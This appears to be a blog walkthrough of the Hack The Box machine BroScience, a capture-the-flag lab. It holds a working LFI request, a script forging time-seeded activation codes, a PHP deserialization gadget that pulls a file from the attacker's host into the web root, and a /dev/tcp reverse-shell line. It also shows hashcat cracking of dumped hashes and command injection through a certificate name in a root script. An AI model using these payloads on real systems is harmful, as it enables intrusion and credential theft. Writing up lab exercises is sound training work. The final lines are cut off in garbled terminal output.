---
layout: post
title: Hack The Box Walkthrough - BroScience
date: 2023-04-08
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2023/04/HTB/BroScience
img: 2023/04/BroScience/BroScience.png
---

In this box, I had to exploit an LFI, a vulnerable token generation, and a serialization vulnerability to get to a shell. Then I had to crack a hashed password, and finally, get code execution in a script running as root.

* Room: BroScience
* Difficulty: Medium
* URL: [https://app.hackthebox.com/machines/BroScience](https://app.hackthebox.com/machines/BroScience)
* Author: [bmdyy](https://app.hackthebox.com/users/485051)

## Enumeration

I began the box by scanning for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
_______________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.11.195:22
Open 10.10.11.195:80
Open 10.10.11.195:443
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-29 08:25 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
...
PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDB5dEat1MGh3CDDnkl4tdWQcTpdWZYHZj5/Orv3PDjSiQ4dg1i35kknwiZrXLiMsUu/4TigP9Kc3h4M1CS7E3/GprpWxuGmipEucoQuNEtaM0sUa8xobtFxOVF46kS0++ozTd4+zbSLsu73SlLcSuSFalhGnHteHj6/ksSeX642103SMqkkmEu/cbgofkoqQOCY
k3Qa42bZq5bjS/auGAlPoAxTjjVtpHnXOKOU7M6gkewD91FB3GAMUdwqR/PJcA5xqGFZm2St9ecSbewCur6pLN5YKnNhvdID4ijWI22gu5pLxHL9XjORMbSUkJbB79VoYJZaNkdOgt+HXR67s9DWI47D6/+pO0dTfQgMFgOCxYheWMDQ2FuyHyGX1CZpMVLAo3sjOvxAqk7eUGutsyBAlYCD4lhSFs6RhSBynahHQah
7+Lv5LKRriZe/fQIgrJrQj+tR4Uhz89eWGrXK9bjN22wy7tVkMG/w5dOwo7S3Wi0aTZfd/17D0z7wSdiAiE=
|   256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCgM9UKdxFmXRJESXdlb+BSl+K1F0YCkOjSa8l+tgD6Y3mslSfrawZkdfq8NKLZlmOe8uf1ykgXjLWVDQ9NrJBk=
|   256 3c6575274ae2ef9391374cfdd9d46341 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMwR+IfRojCwiMuM3tZvdD5JCD2MRVum9frUha60bkN
80/tcp  open  http     syn-ack Apache httpd 2.4.54
|_http-title: Did not follow redirect to https://broscience.htb/
|_http-server-header: Apache/2.4.54 (Debian)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open  ssl/http syn-ack Apache httpd 2.4.54 ((Debian))
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: BroScience : Home
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT/emailAddress=administrator@broscience.htb/localityName=Vienna
| Issuer: commonName=broscience.htb/organizationName=BroScience/countryName=AT/emailAddress=administrator@broscience.htb/localityName=Vienna
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-07-14T19:48:36
| Not valid after:  2023-07-14T19:48:36
| MD5:   5328ddd62f3429d11d26ae8a68d86e0c
| SHA-1: 20568d0d9e4109cde5a22021fe3f349c40d8d75b
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:25
Completed NSE at 08:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:25
Completed NSE at 08:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:25
Completed NSE at 08:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.49 seconds
```

It found three open ports.
* 22 - SSH
* 80 - HTTP
* 443 - HTTPS

I looked at the site on port 80 and was redirected to 'https://broscience.htb/'. I added the domain to my hosts file.

I launched Feroxbuster to check for hidden pages.

```bash
$ feroxbuster -u https://broscience.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php -o ferox.txt -k -s 200,204,301,302,307,308,401,405

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://broscience.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox.txt
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      321c https://broscience.htb/includes => https://broscience.htb/includes/
301      GET        9l       28w      319c https://broscience.htb/images => https://broscience.htb/images/
200      GET      147l      510w        0c https://broscience.htb/
200      GET       42l       97w     1936c https://broscience.htb/login.php
200      GET      147l      510w        0c https://broscience.htb/index.php
200      GET       45l      104w     2161c https://broscience.htb/register.php
200      GET       29l       70w     1309c https://broscience.htb/user.php
302      GET        0l        0w        0c https://broscience.htb/logout.php => https://broscience.htb/index.php
302      GET        1l        3w       13c https://broscience.htb/comment.php => https://broscience.htb/login.php
301      GET        9l       28w      319c https://broscience.htb/styles => https://broscience.htb/styles/
301      GET        9l       28w      323c https://broscience.htb/javascript => https://broscience.htb/javascript/
301      GET        9l       28w      319c https://broscience.htb/manual => https://broscience.htb/manual/
301      GET        9l       28w      326c https://broscience.htb/manual/images => https://broscience.htb/manual/images/
...
200      GET       28l       66w     1256c https://broscience.htb/activate.php
301      GET        9l       28w      331c https://broscience.htb/manual/en/programs => https://broscience.htb/manual/en/programs/
301      GET        9l       28w      332c https://broscience.htb/manual/ru/developer => https://broscience.htb/manual/ru/developer/
[####################] - 58s  3154400/3154400 0s      found:33      errors:1257183
[####################] - 56s   126176/126176  2432/s  https://broscience.htb/
[####################] - 0s    126176/126176  0/s     https://broscience.htb/includes/ => Directory listing (add -e to scan)
[####################] - 0s    126176/126176  0/s     https://broscience.htb/images/ => Directory listing (add -e to scan)
[####################] - 0s    126176/126176  0/s     https://broscience.htb/styles/ => Directory listing (add -e to scan)
[####################] - 55s   126176/126176  2433/s  https://broscience.htb/javascript/
[####################] - 54s   126176/126176  2578/s  https://broscience.htb/manual/
[####################] - 0s    126176/126176  0/s     https://broscience.htb/manual/images/ => Directory listing (add -e to scan)
[####################] - 55s   126176/126176  2297/s  https://broscience.htb/manual/en/
[####################] - 0s    126176/126176  0/s     https://broscience.htb/manual/style/ => Directory listing (add -e to scan)
[####################] - 53s   126176/126176  2547/s  https://broscience.htb/manual/en/misc/
[####################] - 50s   126176/126176  2601/s  https://broscience.htb/manual/de/
...
[####################] - 48s   126176/126176  2616/s  https://broscience.htb/manual/ru/developer/
```

## Local File Inclusion (LFI)

I opened 'https://broscience.htb' in my browser.

![Main Site](/assets/images/2023/04/BroScience/MainSite.png "Main Site")

I looked around the site. The user page appears to allow user enumeration.

![Users](/assets/images/2023/04/BroScience/Users.png "Users")

I extracted the list of users and tried to brute-force the login page with Hydra.

```bash
$ cat usernames.txt
administrator
bill
michael
john
dmytro

$ hydra -L usernames.txt -P /usr/share/seclists/rockyou.txt -u -e sr -s 443 -m '/login.php:username=^USER^&password=^PASS^:incorrect' broscience.htb https-post-form
...
```

It ran for a while and failed to find a working password.

Next, I tried registering a user. But it needed activation of the account through a link sent by email.

![Register](/assets/images/2023/04/BroScience/Register.png "Register")

I kept looking around. Eventually, I saw the image's URL: `https://broscience.htb/includes/img.php?path=bench.png`. This looked like it could be vulnerable to LFI.

I tried loading `https://broscience.htb/includes/img.php?path=/etc/passwd`. The paged showed `Error: Attack detected`. 

I tried encoding the slashes, it gave me the same error. I kept playing with it, I needed to double URL encode the slashes to get the file.

```http
GET /includes/img.php?path=..%252f..%252f..%252f..%252fetc%252fpasswd HTTP/1.1
Host: broscience.htb
Cookie: PHPSESSID=6drat5f8omo5h6l5hmjinrcdai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

```http
HTTP/1.1 200 OK
Date: Sun, 29 Jan 2023 16:33:15 GMT
Server: Apache/2.4.54 (Debian)
Content-Length: 2235
Connection: close
Content-Type: image/png

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

I tried using PHP filters to extract the source code of the application. The code was probably adding a folder name before the file name, so that failed.

I tried to directly read a PHP file without a filter.

```http
GET /includes/img.php?path=..%252findex.php HTTP/1.1
Host: broscience.htb
Cookie: PHPSESSID=6drat5f8omo5h6l5hmjinrcdai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

It worked!

```http
HTTP/1.1 200 OK
Date: Tue, 31 Jan 2023 00:30:48 GMT
Server: Apache/2.4.54 (Debian)
Content-Length: 2182
Connection: close
Content-Type: image/png

<?php
session_start();
?>

<html>
    <head>
        <title>BroScience : Home</title>
        <?php 
        include_once 'includes/header.php';
        include_once 'includes/utils.php';
        $theme = get_theme();
        ?>
        <link rel="stylesheet" href="styles/<?=$theme?>.css">
    </head>
    <body class="<?=get_theme_class($theme)?>">
        <?php include_once 'includes/navbar.php'; ?>
        <div class="uk-container uk-margin">
            <!-- TODO: Search bar -->
            <?php
            include_once 'includes/db_connect.php';
                    
            // Load exercises
            $res = pg_query($db_conn, 'SELECT exercises.id, username, title, image, SUBSTRING(content, 1, 100), exercises.date_created, users.id FROM exercises JOIN users ON author_id = users.id');
            if (pg_num_rows($res) > 0) {
                echo '<div class="uk-child-width-1-2@s uk-child-width-1-3@m" uk-grid>';
                while ($row = pg_fetch_row($res)) {
                    ?>
                    <div>
                        <div class="uk-card uk-card-default <?=(strcmp($theme,"light"))?"uk-card-secondary":""?>">
                            <div class="uk-card-media-top">
                                <img src="includes/img.php?path=<?=$row[3]?>" width="600" height="600" alt="">
                            </div>
                            <div class="uk-card-body">
                                <a href="exercise.php?id=<?=$row[0]?>" class="uk-card-title"><?=$row[2]?></a>
                                <p><?=$row[4]?>... <a href="exercise.php?id=<?=$row[0]?>">keep reading</a></p>
                            </div>
                            <div class="uk-card-footer">
                                <p class="uk-text-meta">Written by <a class="uk-link-text" href="user.php?id=<?=$row[6]?>"><?=htmlspecialchars($row[1],ENT_QUOTES,'UTF-8')?></a> <?=rel_time($row[5])?></p>
                            </div>
                        </div>
                    </div>
                    
                    <?php
                }
                echo '</div>';
            } 
            ?>
        </div>
    </body>
</html>
```

I used that vulnerability to read all the PHP files I could find.

## Activation Code Generation

I extracted the code from `/includes/utils.php`. The first function was used to generate the activation code.

```php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
```
This code was used on user creation, and the generated code was needed to activate the new account.

```php
// Create the account
include_once 'includes/utils.php';
$activation_code = generate_activation_code();
$res = pg_prepare($db_conn, "check_code_unique_query", 'SELECT id FROM users WHERE activation_code = $1');
$res = pg_execute($db_conn, "check_code_unique_query", array($activation_code));

if (pg_num_rows($res) == 0) {
    $res = pg_prepare($db_conn, "create_user_query", 'INSERT INTO users (username, password, email, activation_code) VALUES ($1, $2, $3, $4)');
    $res = pg_execute($db_conn, "create_user_query", array($_POST['username'], md5($db_salt . $_POST['password']), $_POST['email'], $activation_code));

    // TODO: Send the activation link to email
    $activation_link = "https://broscience.htb/activate.php?code={$activation_code}";

    $alert = "Account created. Please check your email for the activation link.";
    $alert_type = "success";
} else {
    $alert = "Failed to generate a valid activation code, please try again.";
}
```

The code was using the current time to seed the random generation. I was about to write a script that would generate and try every possible code for the last minute until it found one that worked. But I went back to the server response to user creation and saw that it was returning the server time.

```http
HTTP/1.1 200 OK
Date: Tue, 31 Jan 2023 00:40:12 GMT
Server: Apache/2.4.54 (Debian)
...
```

I used that time to generate a token and activate my account.

```php
<?php
$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
$time = strtotime('Tue, 31 Jan 2023 00:40:12 GMT');
srand($time);
$activation_code = "";
for ($i = 0; $i < 32; $i++) {
    $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
}
echo 'https://broscience.htb/activate.php?code=' . $activation_code . "\n";
```

I ran the script and used the generated link

```bash
$ php generateCode.php
https://broscience.htb/activate.php?code=OqxSuRjhkh02FEDHXHtPeTLu5PJ8z2fo
```

![Account Activated](/assets/images/2023/04/BroScience/AccountActivated.png "Account Activated")

## Remote Code Execution

I logged into the site with my activated user. I looked around, I could modify my account and add comments under exercises. I tried sending XSS and SSTI payloads, but it did not work.

I kept looking at the source code. The file `db_connect.php` contained database credentials. 

```php
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "REDACTED";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
?>
```

I tried the found password to SSH as bill, but it was rejected.

I looked further in the utils code and saw this code. 

```php
function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}
```

This code used PHP serialization to store and read information in the cookies.

The UserPrefs class did not have much I could use to attack the server.

```php
class UserPrefs {
    public $theme;

    public function __construct($theme = "light") {
		$this->theme = $theme;
    }
}
```

I could serialize a UserPrefs object on my machine. I would control the theme properties, but reading the code, this did not give me much.

But I did not need to serialize a UserPrefs object. The code would unserialize anything I gave it. Reading further, I saw two interesting classes.

```php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
```

The `__wakeup` method is called when an object is unserialized. On waking up, the unserialize `AvatarInterface` object would create an `Avatar` object and call `save` on it. I could control the `$tmp` and `$imgPath` properties. So I could use that to read a file and save it where I wanted.

I created a PHP script to generate the serialized code I needed.

```php
<?php

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp = 'http://10.10.14.2/rce';
    public $imgPath = '/var/www/html/test.php';

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

echo urlencode(base64_encode(serialize(new AvatarInterface()))) . "\n";
```

This created a serialized `AvatarInterface` that would read a file from my machine, and save its contents to `/var/www/html/test.php` on the server. 

I created the file to launch a reverse shell and started a web server on my machine.

```php
<?php

`bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'`;
```
I generated the cookie value and used it to set the `user-prefs` cookie in my browser.

```bash
$ php createCookie.php
TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyMToiaHR0cDovLzEwLjEwLjE0LjIvcmNlIjtzOjc6ImltZ1BhdGgiO3M6MjI6Ii92YXIvd3d3L2h0bWwvdGVzdC5waHAiO30%3D
```

I opened the home page of the site and saw that it requested the `rce` file from my web server.

Finally, I launched a netcat listener and navigated to `https://broscience.htb/test.php`. 

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.195] 41862
bash: cannot set terminal process group (834): Inappropriate ioctl for device
bash: no job control in this shell

www-data@broscience:/var/www/html$ ls
ls
activate.php
comment.php
exercise.php
images
includes
index.php
login.php
logout.php
register.php
styles
swap_theme.php
test2.php
update_user.php
user.php
```

## Getting A User

I was on the server, but as `www-data` which can't do much. I had some database credentials so I use them to see what the db contained.

```bash
www-data@broscience:/var/www/html$ psql -U dbuser -W broscience -p5432 -hlocalhost
Password:
psql (13.9 (Debian 13.9-0+deb11u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

broscience=> Select username, password From users;
```

The `users` table contained usernames and hashed passwords.

```
   username    |             password
---------------+----------------------------------
 administrator | 15657792073e8a843d4f91fc403454e1
 bill          | 13edad4932da9dbb57d9cd15b66ed104
 michael       | bd3dad50e2d578ecba87d5fa15ca5f85
 john          | a7eed23a7be6fe0d765197b1027453fe
 dmytro        | 5d15340bded5b9395d5d14b9c21bc82b
```

I remembered from reading the `db_connect.php` file that the passwords were 'salted' with 'NaCl'. And from the register code that the salt was put before the password, then hashed with `md5`.

```php
md5($db_salt . $_POST['password'])
```
I saved the hashes in a file and used hashcat to crack them.

```bash
$ cat hashes.txt   
administrator:15657792073e8a843d4f91fc403454e1:NaCl
bill:13edad4932da9dbb57d9cd15b66ed104:NaCl
michael:bd3dad50e2d578ecba87d5fa15ca5f85:NaCl
john:a7eed23a7be6fe0d765197b1027453fe:NaCl
dmytro:5d15340bded5b9395d5d14b9c21bc82b:NaCl

$ hashcat -a0 -m20 hashes.txt /usr/share/seclists/rockyou.txt --username
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2869/5803 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 5 digests; 5 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384


13edad4932da9dbb57d9cd15b66ed104:NaCl:REDACTED
5d15340bded5b9395d5d14b9c21bc82b:NaCl:REDACTED
bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:REDACTED
Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 20 (md5($salt.$pass))
Hash.Target......: hashes.txt
Time.Started.....: Sun Jan 29 17:53:33 2023 (3 secs)
Time.Estimated...: Sun Jan 29 17:53:36 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5515.0 kH/s (0.14ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 3/5 (60.00%) Digests (total), 3/5 (60.00%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[21217365786d652121] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 32%

Started: Sun Jan 29 17:53:11 2023
Stopped: Sun Jan 29 17:53:37 2023

$ hashcat -a0 -m20 hashes.txt /usr/share/seclists/rockyou.txt --username --show
bill:13edad4932da9dbb57d9cd15b66ed104:NaCl:REDACTED
michael:bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:REDACTED
dmytro:5d15340bded5b9395d5d14b9c21bc82b:NaCl:REDACTED
```

I used bill's password to connect to the server and get the user flag.

```bash
$ ssh bill@target
bill@target's password:
Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jan  2 04:45:21 2023 from 10.10.14.40

bill@broscience:~$ cat user.txt
REDACTED
```

## Certificate Renewal

I looked around the server. I found a script in `/opt/renew_cert.sh`. The script was looking for a certificate, and if it was expiring soon, it would read some information about it, generate a new one, and move it in bill's home folder.

```bash
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;
fi
```

I thought I might be able to use some of the information it read from the original certificated to get code execution. But I had to find out how the script ran. I uploaded `pspy` to the server and ran it.

```bash
2023/01/29 18:30:01 CMD: UID=0     PID=1462   | /bin/bash /root/cron.sh
2023/01/29 18:30:01 CMD: UID=0     PID=1463   | timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
```

The script was running as root, and reading the certificate in `/home/bill/Certs/broscience.crt`.

I used the command in the script to generate certificates that expired in one day. I played with the different values it read from the certificate before generating a new one and found that I could get code execution in the common name when the file was moved.

```bash
bill@broscience:/tmp/tmp.ML5bZVF2Ow$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout temp.key -out temp.crt -days 1 <<<"CA
QC
MTL
someOrg
Unit
MyName\`id\`
test@test.com
"
Generating a RSA private key
.++++
................................................................................++++
writing new private key to 'temp.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:State or Province Name (full name) [Some-State]:Locality Name (eg, city) []:Organization Name (eg, company) [Internet Widgits Pty Ltd]:Organizational Unit Name (eg, section) []:Common Name (e.g. server FQDN or YOUR name) []:Email Address []:bill@x509 -noout -text -in temp.crt | lessut temp.key -out temp.crt -days 1 <<<"CA

